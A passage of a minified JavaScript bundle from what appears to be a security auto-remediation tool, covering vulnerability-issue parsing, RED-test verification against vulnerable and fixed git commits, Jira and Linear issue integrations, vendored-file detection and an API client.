`),H=null,$=!1;for(let z=0;z<G.length;z++){let U=G[z],K=U.match(/####\s*`([^`]+)`/);if(K){if(H)Q.files.push(H);H={path:K[1],vulnerabilities:[]},$=!0;continue}if($&&H&&U.trim().startsWith("-")){let B=U.match(/-\s*\*\*Line\s+(\d+)\*\*:\s*(.+)/);if(B)H.vulnerabilities.push({line:parseInt(B[1],10),message:B[2].trim()})}if(U.startsWith("###")&&!U.includes("Affected Files")){if($=!1,H)Q.files.push(H),H=null}}if(H)Q.files.push(H);return V.debug("[VulnerabilityExtraction] Parsed issue body:",{type:Q.type,severity:Q.severity,filesCount:Q.files.length,files:Q.files.map((z)=>({path:z.path,vulnerabilitiesCount:z.vulnerabilities.length}))}),Q}function WG(X,Q){let J=[],Y=Qe1(X.body),W=Y.type?Xe1(Y.type):Q?.analysisData?.vulnerabilityType||"unknown";for(let G of Y.files)for(let H of G.vulnerabilities)J.push({file:G.path,line:H.line,type:W,description:H.message,confidence:Y.severity||Q?.analysisData?.severity||"medium",cweId:Y.cweId});if(J.length===0&&Q?.analysisData?.filesToModify)for(let G of Q.analysisData.filesToModify)J.push({file:G,line:0,type:Q.analysisData.vulnerabilityType||"unknown",description:Q.analysisData.reason||"Vulnerability detected",confidence:Q.analysisData.severity||"medium"});return V.debug("[VulnerabilityExtraction] Extracted vulnerabilities from issue",{issueNumber:X.number,vulnerabilitiesCount:J.length,files:J.map((G)=>G.file)}),J}var et1;var JV=$1(()=>{y1();et1={"sql injection":"sql_injection","cross-site scripting (xss)":"xss","command injection":"command_injection","path traversal":"path_traversal","weak cryptography":"weak_cryptography","hardcoded secrets":"hardcoded_secrets","insecure random number generation":"insecure-random","open redirect":"open_redirect","xml external entity (xxe)":"xxe","server-side request forgery (ssrf)":"ssrf","nosql injection":"nosql_injection","ldap injection":"ldap_injection","xpath injection":"xpath_injection","weak hashing algorithm":"weak-hash","insecure deserialization":"insecure_deserialization","prototype pollution":"prototype_pollution","code injection":"code_injection","server-side template injection (ssti)":"template_injection","template injection":"template_injection","insecure jwt configuration":"insecure_jwt","debug mode enabled":"debug_mode","broken access control":"broken_access_control","broken authentication":"broken_authentication","security misconfiguration":"security_misconfiguration","sensitive data exposure":"sensitive_data_exposure","mass assignment":"mass_assignment","log injection":"log_injection","information disclosure":"information_disclosure","improper input validation":"improper_input_validation","cross-site request forgery (csrf)":"csrf","denial of service":"denial_of_service"}});import{execSync as a5}from"child_process";import{writeFileSync as Je1,unlinkSync as Ye1,existsSync as dC,mkdirSync as We1}from"fs";import{join as Ge1,dirname as He1}from"path";function $e1(){let Q=`${process.env.MISE_DATA_DIR||`${process.env.HOME||"/root"}/.local/share/mise`}/shims`,J=process.env.PATH||"",Y=J.includes(Q)?J:`${Q}:${J}`;return{...process.env,PATH:Y}}function ze1(X,Q,J){switch(X.toLowerCase()){case"pytest":return`python -m pytest "${Q}" -x -v`;case"rspec":if(J?.bundleInstallFailed)return`rspec "${Q}" --format documentation`;return`bundle exec rspec "${Q}" --format documentation`;case"vitest":return`npx vitest run "${Q}"`;case"jest":return`npx jest "${Q}" --no-coverage`;case"mocha":return`npx mocha "${Q}"`;case"minitest":return`ruby "${Q}"`;case"phpunit":return`./vendor/bin/phpunit "${Q}"`;case"exunit":return`mix test "${Q}"`;default:return`${X} "${Q}"`}}function GG(X,Q){if(!X)return null;let J=`issue-${Q}`,Y=X?.validation?.[J]||X?.validate?.[J];if(!Y&&X.redTests)Y=X,V.debug("[MITIGATE] Using flat validation data format (redTests at top level)");if(!Y)return V.debug(`[MITIGATE] No validation entry found for ${J}`),null;let W=Y.redTests,G=Y.framework||W?.framework;if(!G)return V.debug(`[MITIGATE] No framework in validation data for ${J}`),null;if(!W)return V.debug(`[MITIGATE] No redTests in validation data for ${J}`),null;let H,$=W.redTests;if($&&Array.isArray($)&&$.length>0)H=$[0].testCode;if(!H){let B=W.red;if(B)H=B.testCode}if(!H)return V.debug(`[MITIGATE] No test code found in redTests for ${J}`),null;let U=Y.testResults?.testFile||W.testFile||Ue1(G),K=Y.branchName||`rsolv/validate/${J}`;return{testCode:H,testFile:U,framework:G,branchName:K}}async function iC(X,Q,J,Y,W){let G=Ge1(Y,Q);try{let H=He1(G);if(!dC(H))We1(H,{recursive:!0});Je1(G,X,"utf-8");let $=ze1(J,Q,W);V.info(`[MITIGATE] Running RED test: ${$}`);let z=a5($,{cwd:Y,encoding:"utf-8",timeout:60000,stdio:["pipe","pipe","pipe"],env:$e1()});return{passed:!0,output:String(z),exitCode:0}}catch(H){let $=H,z=$.status??1,U=$.stdout?typeof $.stdout==="string"?$.stdout:$.stdout.toString():"",K=$.stderr?typeof $.stderr==="string"?$.stderr:$.stderr.toString():"",B=`${U}
${K}`.trim();if(z===127)return V.warn(`[MITIGATE] Test runner not found for ${J}: ${K}`),{passed:!1,output:B,exitCode:z,infrastructureFailure:!0};return{passed:!1,output:B,exitCode:z}}finally{try{if(dC(G))Ye1(G)}catch{}}}async function HG(X,Q,J,Y,W){let G={...W};if(J.framework.toLowerCase()==="rspec"&&G.bundleInstallFailed===void 0)try{a5("bundle check",{cwd:Y,encoding:"utf-8",stdio:"pipe"})}catch{V.info("[MITIGATE] bundle check failed  using bare rspec (not bundle exec)"),G.bundleInstallFailed=!0}let H;try{H=a5("git rev-parse HEAD",{cwd:Y,encoding:"utf-8"}).trim()}catch{H=Q}let $,z;try{V.info(`[MITIGATE] Checking out vulnerable commit ${X.substring(0,8)} for RED test verification`),a5(`git checkout ${X} --quiet`,{cwd:Y,encoding:"utf-8"}),$=await iC(J.testCode,J.testFile,J.framework,Y,G),V.info(`[MITIGATE] RED test on vulnerable commit: ${$.passed?"PASSED (unexpected)":"FAILED (expected)"}`),V.info(`[MITIGATE] Checking out fixed commit ${Q.substring(0,8)} for RED test verification`),a5(`git checkout ${Q} --quiet`,{cwd:Y,encoding:"utf-8"}),z=await iC(J.testCode,J.testFile,J.framework,Y,G),V.info(`[MITIGATE] RED test on fixed commit: ${z.passed?"PASSED (expected)":"FAILED (unexpected)"}`)}finally{try{a5(`git checkout ${H} --quiet`,{cwd:Y,encoding:"utf-8"})}catch{V.warn("[MITIGATE] Failed to restore original HEAD after verification")}}if($.infrastructureFailure||z.infrastructureFailure){let K=$.output||z.output||"unknown";return V.warn(`[MITIGATE] Test runner infrastructure failure: ${K}`),{isValidFix:!1,vulnerableResult:$,fixedResult:z,error:`Test runner infrastructure failure  ${J.framework} not available. Output: ${K}`}}let U=!$.passed&&z.passed;if($.passed)V.warn("[MITIGATE] RED test passed on vulnerable code  test may not detect the vulnerability");if(!z.passed)V.warn("[MITIGATE] RED test failed on fixed code  fix did not resolve the vulnerability");return{isValidFix:U,vulnerableResult:$,fixedResult:z}}function Ue1(X){switch(X.toLowerCase()){case"pytest":return"tests/test_vulnerability_validation.py";case"rspec":return"spec/vulnerability_validation_spec.rb";case"vitest":case"jest":return"__tests__/vulnerability_validation.test.ts";case"mocha":return"test/vulnerability_validation.test.js";case"minitest":return"test/test_vulnerability_validation.rb";case"phpunit":return"tests/VulnerabilityValidationTest.php";case"exunit":return"test/vulnerability_validation_test.exs";default:return"test_vulnerability_validation.txt"}}var YV=$1(()=>{y1()});async function rC(X){try{V.info("Detecting issues for automation");let Q=process.env.GITHUB_REPOSITORY||"",[J,Y]=Q.split("/");if(!J||!Y)throw Error("Repository information not available in environment variables");let W=await A4(J,Y),G=process.env.RSOLV_ISSUE_NUMBER;if(G){V.info(`Processing specific issue #${G}`);let B=await Ve1(J,Y,parseInt(G));return(B?[B]:[]).map((M)=>({id:`github-${M.id}`,number:M.number,title:M.title,body:M.body??"",labels:M.labels.map((L)=>typeof L==="string"?L:L.name),assignees:M.assignees?.map((L)=>L.login)||[],repository:{owner:J,name:Y,fullName:Q,defaultBranch:W.defaultBranch,language:W.language},source:"github",createdAt:M.created_at,updatedAt:M.updated_at,metadata:{htmlUrl:M.html_url,state:M.state,locked:M.locked,draft:M.draft}}))}let H=[X.issueLabel];if(!X.issueLabel.includes("rsolv"))H.push("rsolv");let $=[],z=new Set,U=X.maxIssues;for(let B of H){let q=U?U-$.length:void 0;if(q===0)break;let Z=await Ke1(J,Y,B,q);for(let M of Z)if(!z.has(M.id)){if(z.add(M.id),$.push(M),U&&$.length>=U)break}if(U&&$.length>=U){V.info(`Reached max_issues limit of ${U}, stopping issue detection`);break}}return V.info(`Found ${$.length} issues with labels: ${H.join(" or ")}`),$.map((B)=>({id:`github-${B.id}`,number:B.number,title:B.title,body:B.body??"",labels:B.labels.map((q)=>typeof q==="string"?q:q.name),assignees:B.assignees?.map((q)=>q.login)||[],repository:{owner:J,name:Y,fullName:Q,defaultBranch:W.defaultBranch,language:W.language},source:"github",createdAt:B.created_at,updatedAt:B.updated_at,metadata:{htmlUrl:B.html_url,state:B.state,locked:B.locked,draft:B.draft}}))}catch(Q){throw V.error("Error detecting issues",Q),Error(`Failed to detect issues: ${Q instanceof Error?Q.message:String(Q)}`)}}async function Ke1(X,Q,J,Y){try{let W=v0(),G=Y?Math.min(Y,100):100,{data:H}=await W.issues.listForRepo({owner:X,repo:Q,labels:J,state:"open",per_page:G}),$=H.filter((z)=>!z.pull_request);if(Y&&$.length>Y)return $.slice(0,Y);return $}catch(W){throw V.error(`Error getting issues with label ${J}`,W),Error(`Failed to get issues with label: ${W instanceof Error?W.message:String(W)}`)}}async function Ve1(X,Q,J){try{let Y=await v0(),{data:W}=await Y.issues.get({owner:X,repo:Q,issue_number:J});if(W.pull_request)return V.warn(`Issue #${J} is actually a pull request, skipping`),null;return W}catch(Y){if(V.error(`Error getting issue #${J}`,Y),Y.status===404)return V.warn(`Issue #${J} not found`),null;throw Error(`Failed to get issue: ${Y instanceof Error?Y.message:String(Y)}`)}}var nC=$1(()=>{y1();g9()});class qJ{autofixLabel;rsolvLabel;constructor(X){this.autofixLabel=X.autofixLabel||"autofix",this.rsolvLabel=X.rsolvLabel||"rsolv"}validateConfig(X,Q){let J=Q.filter((Y)=>!X[Y]);if(J.length>0)throw Error(`Missing required configuration fields: ${J.join(", ")}`)}async makeRequest(X,Q={}){try{let J=await fetch(X,{...Q,headers:{...this.getAuthHeaders(),...Q.headers}});if(!J.ok)throw Error(`HTTP ${J.status}: ${J.statusText}`);return J}catch(J){throw V.error(`Platform API request failed: ${X}`,J),J}}hasRsolvLabels(X){let Q=X.map((J)=>J.toLowerCase());return Q.includes(this.autofixLabel.toLowerCase())||Q.includes(this.rsolvLabel.toLowerCase())}extractIssueId(X){let Q=[/^#?(\d+)$/,/^([A-Z]+-\d+)$/,/^([A-Z]+-\d+)$/i,/\/(\d+)\/?$/,/\/([A-Z]+-\d+)\/?$/i];for(let J of Q){let Y=X.match(J);if(Y)return Y[1]}return X}formatError(X,Q){let J=Q?.message||Q?.toString()||"Unknown error";return`${X} failed: ${J}`}}var WV=$1(()=>{y1()});var GV;var aC=$1(()=>{WV();y1();GV=class GV extends qJ{config;baseUrl;authHeader;constructor(X){super(X);this.config=X;this.validateConfig(X,["host","email","apiToken"]),this.baseUrl=`https://${X.host}/rest/api/3`,this.authHeader=`Basic ${Buffer.from(`${X.email}:${X.apiToken}`).toString("base64")}`}getAuthHeaders(){return{Authorization:this.authHeader,Accept:"application/json","Content-Type":"application/json"}}async authenticate(){try{await this.makeRequest(`${this.baseUrl}/myself`),V.info("Successfully authenticated with Jira")}catch(X){throw Error(this.formatError("Jira authentication",X))}}async searchIssues(X){try{return(await(await this.makeRequest(`${this.baseUrl}/search`,{method:"POST",body:JSON.stringify({jql:X,fields:["summary","description","labels","status","created","updated","assignee","reporter"]})})).json()).issues.map((Y)=>this.convertToUnifiedIssue(Y))}catch(Q){throw Error(this.formatError("Jira issue search",Q))}}async getIssue(X){try{let Q=this.extractIssueId(X),Y=await(await this.makeRequest(`${this.baseUrl}/issue/${Q}`)).json();return this.convertToUnifiedIssue(Y)}catch(Q){if(Q.message?.includes("404"))return null;throw Error(this.formatError("Get Jira issue",Q))}}async createComment(X,Q){try{let J=this.extractIssueId(X),W=await(await this.makeRequest(`${this.baseUrl}/issue/${J}/comment`,{method:"POST",body:JSON.stringify({body:{type:"doc",version:1,content:[{type:"paragraph",content:[{type:"text",text:Q}]}]}})})).json();return{id:W.id,body:Q,author:W.author?.displayName||"Unknown",createdAt:new Date(W.created)}}catch(J){return V.error("Failed to create Jira comment",J),null}}async updateIssueStatus(X,Q){try{let J=this.extractIssueId(X),Y=await this.makeRequest(`${this.baseUrl}/issue/${J}/transitions`),{transitions:W}=await Y.json(),G=W.find((H)=>H.name===Q);if(!G)return V.warn(`Status '${Q}' not available for issue ${X}`),!1;return await this.makeRequest(`${this.baseUrl}/issue/${J}/transitions`,{method:"POST",body:JSON.stringify({transition:{id:G.id}})}),!0}catch(J){return V.error("Failed to update Jira issue status",J),!1}}async addLink(X,Q,J){try{let Y=this.extractIssueId(X),W=J||Q;return{id:(await(await this.makeRequest(`${this.baseUrl}/issue/${Y}/remotelink`,{method:"POST",body:JSON.stringify({object:{url:Q,title:W,icon:{url16x16:Q.includes("github.com")?"https://github.com/favicon.ico":void 0,title:Q.includes("github.com")?"GitHub Pull Request":"External Link"}}})})).json()).id,url:Q,title:W,type:"external"}}catch(Y){return V.error("Failed to add link to Jira issue",Y),null}}async addLabel(X,Q){try{let J=this.extractIssueId(X),G=(await(await this.makeRequest(`${this.baseUrl}/issue/${J}?fields=labels`)).json()).fields.labels||[];if(!G.includes(Q))await this.makeRequest(`${this.baseUrl}/issue/${J}`,{method:"PUT",body:JSON.stringify({fields:{labels:[...G,Q]}})});return!0}catch(J){return V.error("Failed to add label to Jira issue",J),!1}}convertToUnifiedIssue(X){return{id:X.id,platform:"jira",key:X.key,title:X.fields.summary,description:X.fields.description||"",labels:X.fields.labels||[],status:X.fields.status.name,url:`https://${this.config.host}/browse/${X.key}`,createdAt:new Date(X.fields.created),updatedAt:new Date(X.fields.updated),assignee:X.fields.assignee?{id:X.fields.assignee.accountId,name:X.fields.assignee.displayName,email:X.fields.assignee.emailAddress}:void 0,reporter:X.fields.reporter?{id:X.fields.reporter.accountId,name:X.fields.reporter.displayName,email:X.fields.reporter.emailAddress}:void 0}}async searchAutofixIssues(){return this.searchIssues(`labels = "${this.autofixLabel}"`)}async searchRsolvIssues(){let X=`labels in ("${this.autofixLabel}", "${this.rsolvLabel}")`;return this.searchIssues(X)}}});var HV;var oC=$1(()=>{WV();y1();HV=class HV extends qJ{apiKey;baseUrl="https://api.linear.app/graphql";teamId;constructor(X){super(X);this.validateConfig(X,["apiKey"]),this.apiKey=X.apiKey,this.teamId=X.teamId}getAuthHeaders(){return{Authorization:this.apiKey,"Content-Type":"application/json"}}async graphqlRequest(X,Q){try{let Y=await(await this.makeRequest(this.baseUrl,{method:"POST",body:JSON.stringify({query:X,variables:Q})})).json();if(Y.errors)throw Error(`Linear GraphQL error: ${JSON.stringify(Y.errors)}`);return Y.data}catch(J){throw Error(this.formatError("Linear GraphQL request",J))}}async searchRsolvIssues(){let Q={labels:{or:[{name:{eq:this.autofixLabel}},{name:{eq:this.rsolvLabel}}]}};if(this.teamId)Q.team={id:{eq:this.teamId}};try{return(await this.graphqlRequest(`
      query SearchIssues($filter: IssueFilter) {
        issues(filter: $filter) {
          nodes {
            id
            identifier
            title
            description
            state {
              name
              type
            }
            labels {
              nodes {
                name
              }
            }
            assignee {
              name
              email
            }
            createdAt
            updatedAt
            url
          }
        }
      }
    `,{filter:Q})).issues.nodes.map((Y)=>this.convertToUnifiedIssue(Y))}catch(J){throw V.error("Failed to search Linear issues:",J),J}}async getIssue(X){try{let J=await this.graphqlRequest(`
      query GetIssue($id: String!) {
        issue(id: $id) {
          id
          identifier
          title
          description
          state {
            name
            type
          }
          labels {
            nodes {
              name
            }
          }
          assignee {
            name
            email
          }
          createdAt
          updatedAt
          url
        }
      }
    `,{id:X});return J.issue?this.convertToUnifiedIssue(J.issue):null}catch(J){return V.error(`Failed to get Linear issue ${X}:`,J),null}}async createComment(X,Q){try{let Y=await this.graphqlRequest(`
      mutation CreateComment($issueId: String!, $body: String!) {
        commentCreate(
          input: {
            issueId: $issueId
            body: $body
          }
        ) {
          success
          comment {
            id
            body
            user {
              name
              email
            }
            createdAt
          }
        }
      }
    `,{issueId:X,body:Q});if(!Y.commentCreate.success)throw Error("Failed to create comment");let W=Y.commentCreate.comment;return{id:W.id,body:W.body,author:W.user.name,createdAt:new Date(W.createdAt)}}catch(Y){return V.error(`Failed to create comment on Linear issue ${X}:`,Y),null}}async addLink(X,Q,J){let W=`\uD83D\uDD17 Related: ${J?`[${J}](${Q})`:Q}`,G=await this.createComment(X,W);if(!G)return null;return{id:G.id,url:Q,title:J||Q,type:"external"}}async updateIssueStatus(X,Q){try{let Y=await this.graphqlRequest(`
      query GetStates($name: String!) {
        workflowStates(filter: { name: { eq: $name } }) {
          nodes {
            id
            name
            type
          }
        }
      }
    `,{name:Q});if(Y.workflowStates.nodes.length===0)return V.error(`No Linear state found with name: ${Q}`),!1;let W=Y.workflowStates.nodes[0].id,G=`
        mutation UpdateIssue($issueId: String!, $stateId: String!) {
          issueUpdate(
            id: $issueId
            input: { stateId: $stateId }
          ) {
            success
          }
        }
      `;return(await this.graphqlRequest(G,{issueId:X,stateId:W})).issueUpdate.success}catch(Y){return V.error(`Failed to update Linear issue ${X} status:`,Y),!1}}async addLabel(X,Q){try{let Y=await this.graphqlRequest(`
      query GetLabel($name: String!) {
        issueLabels(filter: { name: { eq: $name } }) {
          nodes {
            id
            name
          }
        }
      }
    `,{name:Q}),W;if(Y.issueLabels.nodes.length===0){let z=await this.graphqlRequest(`
          mutation CreateLabel($name: String!) {
            issueLabelCreate(
              input: { name: $name }
            ) {
              success
              issueLabel {
                id
              }
            }
          }
        `,{name:Q});if(!z.issueLabelCreate.success)return!1;W=z.issueLabelCreate.issueLabel.id}else W=Y.issueLabels.nodes[0].id;let G=`
        mutation AddLabel($issueId: String!, $labelId: String!) {
          issueAddLabel(
            id: $issueId
            labelId: $labelId
          ) {
            success
          }
        }
      `;return(await this.graphqlRequest(G,{issueId:X,labelId:W})).issueAddLabel.success}catch(Y){return V.error(`Failed to add label to Linear issue ${X}:`,Y),!1}}convertToUnifiedIssue(X){return{id:X.id,platform:"linear",key:X.identifier,title:X.title,description:X.description||"",labels:X.labels.nodes.map((Q)=>Q.name),status:X.state.name,statusCategory:this.mapLinearStateType(X.state.type),assignee:X.assignee?.name,createdAt:new Date(X.createdAt),updatedAt:new Date(X.updatedAt),url:X.url}}mapLinearStateType(X){switch(X.toLowerCase()){case"backlog":case"unstarted":return"todo";case"started":case"in_progress":return"in_progress";case"completed":case"done":case"canceled":return"done";default:return"todo"}}}});class $G{static create(X,Q){switch(X){case"jira":if(!Q.jira)throw Error("Jira configuration is required");return new GV(Q.jira);case"linear":if(!Q.linear)throw Error("Linear configuration is required");return new HV(Q.linear);case"gitlab":throw Error("GitLab integration not yet implemented");default:throw Error(`Unsupported platform: ${X}`)}}}var sC=$1(()=>{aC();oC()});var zG={};Y9(zG,{detectIssuesFromAllPlatforms:()=>Be1});async function Be1(X){let Q=[],J=X.maxIssues;try{let Y=await rC(X);if(Q.push(...Y),V.info(`Found ${Y.length} GitHub issues`),J&&Q.length>=J)return V.info(`Limiting to first ${J} issues (max_issues: ${J})`),Q.slice(0,J)}catch(Y){V.error("Error detecting GitHub issues",Y)}if(process.env.JIRA_HOST&&process.env.JIRA_EMAIL&&process.env.JIRA_API_TOKEN){if(!J||Q.length<J)try{let Y=await qe1(X);if(Q.push(...Y),V.info(`Found ${Y.length} Jira issues`),J&&Q.length>=J)return V.info(`Limiting to first ${J} issues (max_issues: ${J})`),Q.slice(0,J)}catch(Y){V.error("Error detecting Jira issues",Y)}}if(process.env.LINEAR_API_KEY){if(!J||Q.length<J)try{let Y=await Ze1(X);if(Q.push(...Y),V.info(`Found ${Y.length} Linear issues`),J&&Q.length>=J)return V.info(`Limiting to first ${J} issues (max_issues: ${J})`),Q.slice(0,J)}catch(Y){V.error("Error detecting Linear issues",Y)}}if(process.env.GITLAB_TOKEN)V.info("GitLab integration not yet implemented");if(V.info(`Total issues found across all platforms: ${Q.length}`),J&&Q.length>J)return V.info(`Limiting to first ${J} issues (max_issues: ${J})`),Q.slice(0,J);return Q}async function qe1(X){let Q={jira:{host:process.env.JIRA_HOST,email:process.env.JIRA_EMAIL,apiToken:process.env.JIRA_API_TOKEN,autofixLabel:process.env.JIRA_AUTOFIX_LABEL||"autofix",rsolvLabel:process.env.JIRA_RSOLV_LABEL||"rsolv"}},J=$G.create("jira",Q),Y;if(process.env.JIRA_JQL)Y=await J.searchIssues(process.env.JIRA_JQL);else Y=await J.searchRsolvIssues();return V.info(`Found ${Y.length} Jira issues with rsolv/autofix labels`),Y.map((W)=>tC(W))}async function Ze1(X){let Q={linear:{apiKey:process.env.LINEAR_API_KEY,teamId:process.env.LINEAR_TEAM_ID,autofixLabel:process.env.LINEAR_AUTOFIX_LABEL||"autofix",rsolvLabel:process.env.LINEAR_RSOLV_LABEL||"rsolv"}},Y=await $G.create("linear",Q).searchRsolvIssues();return V.info(`Found ${Y.length} Linear issues with rsolv/autofix labels`),Y.map((W)=>tC(W))}function tC(X){let Q=Me1(X);return{id:X.id,number:parseInt(X.key?.split("-")[1]||"0"),title:X.title,body:X.description,labels:X.labels,assignees:X.assignee?[typeof X.assignee==="string"?X.assignee:X.assignee.name]:[],repository:Q||{owner:"unknown",name:"unknown",fullName:"unknown/unknown",defaultBranch:"main",language:"unknown"},source:X.platform,createdAt:X.createdAt.toISOString(),updatedAt:X.updatedAt.toISOString(),metadata:{htmlUrl:X.url,state:X.status,locked:!1,draft:!1,platformKey:X.key}}}function Me1(X){let J=/https?:\/\/github\.com\/([^/]+)\/([^/\s]+)/g.exec(X.description);if(J){let[,Y,W]=J;return{owner:Y,name:W,fullName:`${Y}/${W}`,defaultBranch:"main",language:"unknown"}}if(X.customFields?.githubRepository){let[Y,W]=X.customFields.githubRepository.split("/");return{owner:Y,name:W,fullName:X.customFields.githubRepository,defaultBranch:X.customFields.githubDefaultBranch||"main",language:X.customFields.githubLanguage||"unknown"}}return null}var UG=$1(()=>{y1();nC();sC()});import*as KG from"path";import*as $V from"fs/promises";class zV{VENDOR_PATTERNS=["node_modules","vendor","bower_components","jspm_packages","packages","third_party","external","libs","dependencies","dist","app/assets/javascripts","public/assets","public/packs","static/vendor","public/vendor","build","_build","out"];MINIFIED_PATTERNS=[".min.js","-min.js",".bundle.js",".min.css","-min.css"];VENDOR_INDICATORS={filePatterns:[/jquery[.-]?([\d.]+)?(?:\.min)?\.js$/i,/bootstrap[.-]?([\d.]+)?(?:\.min)?\.(?:js|css)$/i,/angular[.-]?([\d.]+)?(?:\.min)?\.js$/i,/react[.-]?([\d.]+)?(?:\.min)?\.js$/i,/vue[.-]?([\d.]+)?(?:\.min)?\.js$/i,/lodash[.-]?([\d.]+)?(?:\.min)?\.js$/i,/moment[.-]?([\d.]+)?(?:\.min)?\.js$/i],headerComments:[/\/\*!?\s*jQuery\s+v?([\d.]+)/i,/\/\*!?\s*Bootstrap\s+v?([\d.]+)/i,/\/\*!?\s*Angular\s+v?([\d.]+)/i,/\/\*!?\s*React\s+v?([\d.]+)/i,/\/\*!?\s*Vue\.js\s+v?([\d.]+)/i,/Copyright\s+\(c\)\s+.*\s+Foundation/i,/Licensed\s+under\s+MIT/i,/\/\*!?\s*\w+\.js\s+v?\d+\.\d+\.\d+/]};async isVendorFile(X,Q){if(this.matchesVendorPattern(X))return!0;if(this.isMinified(X))return!0;if(this.matchesKnownLibrary(X))return!0;if(await this.containsVendorIndicators(X,Q))return!0;return!1}async containsVendorIndicators(X,Q){if(Q)return this.hasVendorHeader(Q);try{let Y=(await $V.readFile(X,"utf-8")).substring(0,500);return this.hasVendorHeader(Y)}catch{return!1}}async identifyLibrary(X,Q){if(!(await this.isVendorFile(X)||Q&&this.hasVendorHeader(Q)))return null;if(Q){let W=this.extractFromHeader(Q);if(W)return W}let Y=this.extractFromPath(X);if(Y)return Y;if(!Q)try{let G=(await $V.readFile(X,"utf-8")).substring(0,500);return this.extractFromHeader(G)}catch{}return{name:"unknown-vendor",version:"unknown"}}matchesVendorPattern(X){let Q=X.replace(/\\/g,"/");return this.VENDOR_PATTERNS.some((J)=>Q.includes(`/${J}/`)||Q.includes(`${J}/`))}isMinified(X){let Q=KG.basename(X).toLowerCase();return this.MINIFIED_PATTERNS.some((J)=>Q.includes(J))}matchesKnownLibrary(X){let Q=KG.basename(X);return this.VENDOR_INDICATORS.filePatterns.some((J)=>J.test(Q))}hasVendorHeader(X){return this.VENDOR_INDICATORS.headerComments.some((Q)=>Q.test(X))}extractFromPath(X){let Q=KG.basename(X);for(let Y of this.VENDOR_INDICATORS.filePatterns){let W=Q.match(Y);if(W){let G=this.getLibraryNameFromPattern(Y),H=W[1]||"unknown";return{name:G,version:H}}}let J=Q.match(/^([\w-]+)[.-]([\d.]+)(?:\.min)?\.(?:js|css)$/);if(J)return{name:J[1].toLowerCase(),version:J[2]};return null}extractFromHeader(X){let Q=X.match(/\/\*!?\s*Bootstrap\s+v?([\d.]+)(?:\s+\([^)]+\))?/i);if(Q)return{name:"bootstrap",version:Q[1]||"unknown"};for(let J of this.VENDOR_INDICATORS.headerComments){let Y=X.match(J);if(Y){let W=this.getLibraryNameFromHeader(X,J),G=Y[1]||"unknown";if(W)return{name:W.toLowerCase(),version:G}}}return null}getLibraryNameFromPattern(X){let J=X.source.match(/^(\w+)/);return J?J[1].toLowerCase():"unknown"}getLibraryNameFromHeader(X,Q){let J=Q.source;if(J.includes("jQuery"))return"jquery";if(J.includes("Bootstrap"))return"bootstrap";if(J.includes("Angular"))return"angular";if(J.includes("React"))return"react";if(J.includes("Vue"))return"vue";let Y=X.match(/\/\*!?\s*(\w+)(?:\.js)?\s+v/i);if(Y)return Y[1].toLowerCase();return null}}var eC=()=>{};import*as VG from"fs";import*as XP from"path";class QP{vendorDetector;constructor(){this.vendorDetector=new zV}extractFilesFromIssue(X){let Q=[],J=X.body?.split(`
`)||[];for(let W of J){let G=W.match(/\*\*File\*\*:\s*(.+)/);if(G)Q.push(G[1].trim());let H=W.match(/^File:\s*(.+)/);if(H)Q.push(H[1].trim());let $=W.match(/\/\/\s*File:\s*(.+)/);if($)Q.push($[1].trim())}let Y=X.title?.match(/in\s+(.+\.(js|ts|jsx|tsx|py|java|php|rb|go))/);if(Y)Q.push(Y[1]);return[...new Set(Q)]}async checkForVendorFiles(X){let Q=[],J=this.extractFilesFromIssue(X);V.info(`Checking ${J.length} files for vendor status in issue #${X.number}`);for(let Y of J)if(await this.vendorDetector.isVendorFile(Y))Q.push(Y),V.info(`Detected vendor file: ${Y}`);return{isVendor:Q.length>0,files:Q}}checkVendorStatusFromValidation(X,Q){try{let J=XP.join(X,".rsolv","validation",`issue-${Q}.json`);if(!VG.existsSync(J))return V.debug(`No validation results found for issue #${Q}`),{isVendor:!1,files:[]};let Y=JSON.parse(VG.readFileSync(J,"utf-8"));if(Y.vendoredFile)return V.info(`Issue #${Q} marked as vendor file in validation`),{isVendor:!0,files:Y.affectedVendorFiles||[]};return{isVendor:!1,files:[]}}catch(J){return V.warn(`Error reading validation status for issue #${Q}:`,J),{isVendor:!1,files:[]}}}formatVendorMessage(X){if(X.length===0)return"";return`Vendor/third-party files detected:
${X.map((J)=>`  - ${J}`).join(`
`)}

These files cannot be directly patched. Library update required.`}async isVendorFile(X){return await this.vendorDetector.isVendorFile(X)}}var BG;var UV=$1(()=>{eC();y1();BG=new QP});class KV{apiKey;baseUrl;maxRetries=3;baseDelay=100;constructor(X,Q){this.apiKey=X;this.baseUrl=Q||process.env.RSOLV_API_URL||"https://api.rsolv.dev"}async detectFramework(X){return this.makeRequest("/api/v1/framework/detect",X)}async analyze(X){return this.makeRequest("/api/v1/test-integration/analyze",X)}async generate(X){return this.makeRequest("/api/v1/test-integration/generate",X)}async makeRequest(X,Q,J=0){let Y=`${this.baseUrl}${X}`;try{let W=await fetch(Y,{method:"POST",headers:{"x-api-key":this.apiKey,"Content-Type":"application/json"},body:JSON.stringify(Q)});if(W.status>=400&&W.status<500){if(W.status===401)throw Error("Unauthorized: Invalid API key");let G=`HTTP ${W.status}: ${W.statusText}`;try{let H=await W.json();if(H.error)G=`HTTP ${W.status}: ${H.error}`}catch{}throw Error(G)}if(W.status>=500){if(J<this.maxRetries){let G=this.baseDelay*Math.pow(2,J);return V.warn(`Server error (${W.status}), retrying in ${G}ms (attempt ${J+1}/${this.maxRetries})`),await this.sleep(G),this.makeRequest(X,Q,J+1)}throw Error(`Server error after ${this.maxRetries} attempts: ${W.statusText}`)}if(!W.ok)throw Error(`Unexpected response: ${W.status} ${W.statusText}`);return await W.json()}catch(W){if(this.isRetriableError(W)&&J<this.maxRetries){let G=this.baseDelay*Math.pow(2,J);return V.warn(`Network error, retrying in ${G}ms (attempt ${J+1}/${this.maxRetries}):`,W),await this.sleep(G),this.makeRequest(X,Q,J+1)}throw W}}isRetriableError(X){if(X instanceof TypeError&&X.message.includes("fetch"))return!0;return["ECONNREFUSED","ENOTFOUND","ETIMEDOUT","ECONNRESET","Network timeout","Network error"].some((J)=>X?.message?.includes(J)||X?.code?.includes(J))}sleep(X){return new Promise((Q)=>setTimeout(Q,X))}}var JP=$1(()=>{y1()});var YP,WP;var 